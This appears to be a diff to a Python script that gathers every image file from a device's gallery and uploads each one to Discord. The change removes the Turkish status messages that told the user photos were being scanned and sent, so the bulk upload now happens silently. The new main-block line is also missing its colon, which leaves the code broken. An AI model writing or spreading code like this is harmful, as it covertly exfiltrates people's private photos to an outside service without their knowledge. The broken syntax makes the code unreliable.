@@ -34,10 +34,7 @@ def find_images_in_gallery():
                         image_files.append(os.path.join(root, file))
     return image_files
 
-if __name__ == '__main__':
-    print("Galeri taranıyor...")
-    images = find_images_in_gallery()
-    print(f"{len(images)} fotoğraf bulundu, gönderiliyor.")
+if __name__ == '__main__'
+    images = find_images_in_gallery() 
     for img in images:
-        upload_file_to_discord(img)
-    print("Tüm fotoğraflar gönderildi.")
+        upload_file_to_discord(img) 
